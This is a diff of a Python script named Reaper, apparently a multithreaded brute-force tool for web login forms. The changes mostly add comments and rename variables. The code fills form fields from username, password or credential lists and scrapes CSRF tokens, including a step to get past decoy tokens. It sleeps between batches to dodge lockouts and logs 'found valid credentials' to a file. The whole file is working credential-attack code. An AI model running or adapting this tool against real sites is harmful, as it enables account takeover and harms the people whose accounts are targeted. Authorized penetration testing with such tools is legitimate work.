@@ -27,99 +27,117 @@ SOFTWARE.
 import sys,requests,re,time,os,threading,queue
 from bs4 import BeautifulSoup as Soup
 
-#---Class section---
+#---class section---
 class mythread (threading.Thread):
+	#initialize mythread subclass
 	def __init__(self, name, Q, urlQ):
+		#invoke the base class constructor
 		threading.Thread.__init__(self)
 		self.Q = Q
 		self.urlQ = urlQ
+	#the functions that each thread runs when started
 	def run(self):	
 		print(self.name, "starting")
+		#call the process function
 		process(self.name, self.Q, self.urlQ)
 		print("Exit", self.name)
-		threads.append(self.name)		
-		finish()		
+		#append the thread which finished to the threads list
+		threads.append(self.name)
+		#call the finish function		
+		finish()
+		
+#---function section---
 
 def process(threadName, Q, urlQ):
+	#check if the Q queue is empty
 	while not Q.empty():
+		#acquire the lock
 		tlock.acquire()
-		if urlQ.qsize() > 1:
-			#tlock.acquire()	
+		#check if there are more than 1 url in the urlQ
+		if urlQ.qsize() > 1:	
+			#get a url from the urlQ
 			url = urlQ.get()
-			for i in param:
+			#do for every item in the parameters list
+			for i in parameters_list:
 				try:
-					ti
+					#check if take_a_nap is set
+					take_a_nap
 				except NameError:
 					pass
 				else: 
-				
-					if param.index(i) != 0 and param.index(i) % int(number_of_tries) == 0:
+					#check if the thread should sleep
+					if parameters_list.index(i) != 0 and parameters_list.index(i) % int(number_of_tries) == 0:
 						print(threadName, "sleeping for", time_to_sleep, "seconds")
 						time.sleep(int(time_to_sleep))
 						print(threadName, "awake") 
-				print(threadName, "processing item %s url: %s" % (len(param)-param.index(i), url))
-				if i != param[0]:
+				print(threadName, "processing item %s url: %s" % (parameters_list.index(i) + 1, url))
+				#if it is not the first time the loop is executed reacquire the lock
+				if i != parameters_list[0]:
 					tlock.acquire()
+				#call the parametersfunc function
 				parametersfunc(threadName, i, url)			
 		else:		
+			#if there is one url in the urlQ
 			if urlQ.qsize() == 1:
-				u = urlQ.get()
-				ur = u.split()
-				li.extend(ur)
-			url = "".join(li)	
+				#get the url from the urlQ 
+				url = urlQ.get()
+				#put url back in urlQ so other threads can use it
+				urlQ.put(url)	
 			try:
-				ti
+				#check if take_a_nap is set
+				take_a_nap
 			except NameError:
 				pass
 			else: 
-				try:
-					t
-				except NameError:
-					t = 0
-				else:
+				global t 
+				#check if the thread should sleep
+				if t != 0 and t % int(number_of_tries) == 0:
 					t += 1	
-					if t != 0 and t % int(number_of_tries) == 0:
-						print(threadName, "sleeping for", time_to_sleep, "seconds")
-						time.sleep(int(time_to_sleep))
-						print(threadName, "awake")
-			#tlock.acquire()
+					print(threadName, "sleeping for", time_to_sleep, "seconds")
+					time.sleep(int(time_to_sleep))
+					print(threadName, "awake")
+				else:
+					t += 1
+			#wait until the flag is true (if true return immediately)
 			event.wait()
+			#set the flag to false so the other threads wait for this thread to check if Q is empty
 			event.clear()
+			#check again if the Q is empty
 			if Q.empty():
+				#release the lock
 				tlock.release()
+				#set the flag to true so the other threads can continue
 				event.set()
+				#return from the function
 				return
 			else:
-				par = Q.get()
+				#get the parameters from the Q
+				parameters = Q.get()
+			#set the flag to true so the other threads can continue
 			event.set()
-			print(threadName, "processing item %s url: %s" % (Q.qsize() + 1, url))		
-			parametersfunc(threadName, par, url)
+			global creds_index
+			print(threadName, "processing item %s url: %s" % (creds_index, url))
+			creds_index += 1	
+			#call the parametersfunc function	
+			parametersfunc(threadName, parameters, url)
 					
-def parametersfunc(threadName, p, url):	
+def parametersfunc(threadName, p, url):
+		#release the lock	
 		tlock.release()
-		#Make Q item a str
-		parameters_str = str(p)
-		#Make parameters string a list
-		parameters_list = parameters_str.split("/")
-		parameters_tuple = ()
-		parameters_dict = {}
+		#set some variables
 		parameters = {}
-		#Make parameters list a tuple
+		#make the parameters a list
+		parameters_list = p.split("/")
+		#make parameters list a dictionary (needed from the requests module)
 		for i in range(0,len(parameters_list)):			
 				para = parameters_list[i].split("=")
-				lala = tuple(para)		
-				parameters_tuple = parameters_tuple + lala
-		#Make parameters tuple a dictionary
-		for i in range(0,len(parameters_tuple) -1):						
-				if i % 2 == 0:
-					parameters_dict[parameters_tuple[i]] = parameters_tuple[i+1]
-					parameters.update(parameters_dict)			
-		#Make a simple url request to get the cookie and the csrf token		
+				parameters[para[0]] = para[1]					
+		#make a url get request to get the cookies and the csrf token		
 		req = requests.get(url)		           
-		#Extract the cookie	
+		#extract the cookies	
 		cookie = req.cookies 
-		#Extract the csrf token and add it to parameters
-		#If the csrf token is embedded in the HTML:				
+		#extract the csrf token and add it to parameters
+		#if the csrf token is embedded in the HTML:				
 		for key, value in parameters.items():
 			if value == "TOKEN":		
 				html = req.text
@@ -128,74 +146,87 @@ def parametersfunc(threadName, p, url):
 					csrf_token = soup.find_all(attrs={ "name" : key })[0].get('value')				
 				except IndexError:
 					return
-				else:			
+				else:	
+					#replace TOKEN with the csrf_token		
 					parameters[key] = csrf_token   
-		#If the csrf token is in a script:
+		#if the csrf token is in a script:
 		for key, value in parameters.items():
 			if value == "SCRIPT":		
 				html = req.text
-				token = ""
+				csrf_token = ""
 				try:
-					re.search(key+ ".*?value.*?=.*?\w.*?;", html)
+					#search the html text for the csrf_token
+					re.search(key + ".*?value.*?=.*?\w.*?;", html)
 				except IndexError:
 					return
 				else:
+					#find all accounts of csrf_token in the html text (there might be more than one if
+					#the site has included more as comments)
 					csrf_token1 = re.findall(key + ".*?value.*?=.*?\w.*?;", html)
-					#If there are comments to fool Reaper
+					#if there are comments to fool Reaper
 					if len(csrf_token1) > 1:
-						req2 = requests.get(url)
-						cookie = req2.cookies
-						html2 = req2.text
-						csrf_token2 = re.findall(key + ".*?value.*?=.*?\w.*?;", html2)
+						#make a second get request 
+						req = requests.get(url)
+						#extract the cookies again cause they change with each request
+						cookie = req.cookies
+						html = req.text
+						#find all the accounts of csrf_token in the html text again
+						csrf_token2 = re.findall(key + ".*?value.*?=.*?\w.*?;", html)
+						#cross-check the results and remove those which are the same
 						for i in csrf_token1:
 							for j in csrf_token2:
 								if i == j:
 									csrf_token1.remove(i)
-					csrf_token = str(csrf_token1).split("=")
+					#token should be a list with 2 items (the csrf_token is included in the 2nd item)
+					token = str(csrf_token1).split("=")
 					try:
-						csrf_token[1]
+						token[1]
 					except IndexError:
 						return
 					else:
-						for i in csrf_token[1]:
+						#get only the alphanumeric characters from the token
+						for i in token[1]:
 							if i.isalnum():
-								token += i
-					parameters[key] = token  
-		#Make the post request and parse the results	
+								csrf_token += i
+					#replace TOKEN with the csrf_token
+					parameters[key] = csrf_token  
+		#make the post request and parse the results	
 		req = requests.post(url, cookies=cookie, data=parameters)
-		html = req.text
-		soup = Soup(html, 'lxml')
-		#Find and write into a file successful attempts			
-		#Optional way: check if the same parameters exist in the page served after the request
+		#find and write into a file any successful attempts			
+		#second_way: check if the same parameters exist in the page served after the request
 		try:
-			sec
+			second_way
 		except NameError:
 			pass
 		else:
+			html = req.text
+			soup = Soup(html, 'lxml')
 			for key, value in parameters.items():
 				try:
 					soup.find_all(attrs={ "name" : key })[0]
 				except IndexError:
 					print ("Found valid credentials: %s , %s" % (url, parameters))
 					global pas2
+					#write the successful attempts in the file
 					pas2 = open(save,'a')
 					pas2.write('%s\n' % (parameters))
 					pas2.close()
 					return
 				else:
 					return
-		#Default way: check the url of the page served after the request
+		#default way: check the url of the page served after the request
 		if req.url == (url + "/") or req.url == url or req.url == page:
 			pass
 		else:
 			print ("Found valid credentials: %s , %s" % (url, parameters))
 			global pas
+			#write the successful attempts in the file
 			pas = open(save,'a')
 			pas.write('%s\n' %(parameters))
 			pas.close()
 	
 def finish():	
-	#Final success or failure message
+	#check if all the threads finished
 	if len(threads) == len(threadList):
 		print("All threads exited")	
 		try:
@@ -210,11 +241,9 @@ def finish():
 		else:
 			print('The valid credentials have been stored to ' + save)
 			
-#---End of class section---
+#---parameters section---
 
-#---Get the parameters section---
-
-#Display help
+#display help
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-h":	
 		help = open(os.path.abspath('reaper') + '/help','r')
@@ -222,39 +251,39 @@ for i in range(0,len(sys.argv)):
 		help.close()	
 		sys.exit()
 
-#Read and split the url file if it exists
+#read and split the url file 
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-URL":	
 		urlfile = open(sys.argv[i+1], "r")
-		url1 = urlfile.read().split("\n")
-		url1 = url1[:-1]
-		for j in range(0,len(url1)):
-			for i in url1:
+		url = urlfile.read().split("\n")
+		url = url[:-1]
+		for j in range(0,len(url)):
+			for i in url:
 				if i == "":
-					url1.remove(i)
+					url.remove(i)
 		urlfile.close()
 
-#File to save results
+#file to save results
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-f":		
 		save = sys.argv[i+1]
 
-#Url
+#read the url
 for i in range(0,len(sys.argv)):
-	if sys.argv[i] == "-url":
-		url1 = sys.argv[i+1].split() 	
+	if sys.argv[i] == "-url": 	
+		url = sys.argv[i+1].split() 		
 
-#Username
+#read the username
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-u":
 		usernames = sys.argv[i+1].split() 
 
-#Password
+#read the password
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-p":
 		passwords = sys.argv[i+1].split() 
 
-#Read and split the credentials file if it exists.
+#read and split the credentials file 
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-up":	
 		creds = open(sys.argv[i+1], "r")
@@ -265,9 +294,9 @@ for i in range(0,len(sys.argv)):
 				if i == "":
 					credentials.remove(i)
 		creds.close()
-		jo = None				
+		creds_file = None				
 
-#Read and split the username file if it exists.
+#read and split the username file 
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-U":	
 		userfile = open(sys.argv[i+1], "r")
@@ -279,7 +308,7 @@ for i in range(0,len(sys.argv)):
 					usernames.remove(i)
 		userfile.close()
 
-#Read and split the password file if it exists.
+#read and split the password file 
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-P":	
 		passfile = open(sys.argv[i+1], "r")
@@ -291,83 +320,87 @@ for i in range(0,len(sys.argv)):
 					passwords.remove(i)
 		passfile.close()
 
-#Get the parameters and make them a list
+#get the parameters and make them a list
 for i in range(0,len(sys.argv)):
 	if re.search("=.*?/", sys.argv[i]):
-		param = []
+		parameters_list = []
 		try:
-			jo
+			creds_file
 		except NameError:
 			pass
 		else: 
+			#for each credentials combination
 			for j in range(0,len(credentials)):
-				jo = credentials[j].split(":")
-				parameters = sys.argv[i].replace('USERNAME', jo[0])		
-				parameters = parameters.replace('PASSWORD', jo[1])
+				#split the credentials
+				creds = credentials[j].split(":")
+				#replace USERNAME and PASSWORD with the credentials
+				parameters = sys.argv[i].replace('USERNAME', creds[0])		
+				parameters = parameters.replace('PASSWORD', creds[1])
 				parameters = parameters.split()
-				param.extend(parameters)
+				#extend the param list with the parameters
+				parameters_list.extend(parameters)
 			break
+		#for each combination of username and password
 		for username in usernames: 
 			for password in passwords:
-				#Replace usernames and passwords to the queue from the ones from files		
+				#replace USERNAME and PASSWORD 	
 				parameters = sys.argv[i].replace('USERNAME', username)		
 				parameters = parameters.replace('PASSWORD', password)
 				parameters = parameters.split()
-				param.extend(parameters)
+				#extend the param list with the parameters
+				parameters_list.extend(parameters)
 
-#Set the timing
+#set the sleeping variable
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-t":
 		timing = sys.argv[i+1].split(":") 	
 		number_of_tries = timing[0]
 		time_to_sleep = timing[1]		
-		ti = 1
+		take_a_nap = 1
 
-#If the page changes with failed attempts
+#if the page changes with failed attempts
 page = 0
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-c":
 		page = sys.argv[i+1]
 
-#If the second way of validating credentials is enabled
+#if the second way of validating credentials is enabled
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-s":
-		sec = 1
+		second_way = 1
 
-#Set the number of threads
+#set the number of threads
 threadList = ['Thread-1']
 for i in range(0,len(sys.argv)):
 	if sys.argv[i] == "-th":
 		for j in range(0, int(sys.argv[i+1]) - 1):
 			threadList.append("Thread-%s" % (j + 1))
 			
-#---End of Get the parameters section---
+#---declare variables and start threads---
 
-#---Declare variables and start threads---
+threads = []
+t = 0
+creds_index = 1
 tlock = threading.Lock()
 Q = queue.Queue()
 urlQ = queue.Queue()
-threads = []
-li = []
 event = threading.Event()
+#set the flag to true
 event.set()
 
-#Fill the Q
-for i in param:
+#fill the Q
+for i in parameters_list:
 	Q.put(i)
 print("\nNumber of credential combinations:", Q.qsize())
 
-#Fill the urlQ
-for i in url1: 
+#fill the urlQ
+for i in url: 
 	urlQ.put(i)
 print("Number of urls:", urlQ.qsize())
 
 print ("Starting threads...")  	
 
-#Create threads
+#create the threads
 for tName in threadList:
 	thread = mythread(tName, Q, urlQ)
 	thread.start()
-	
-#---End of the variables and threads section---
-
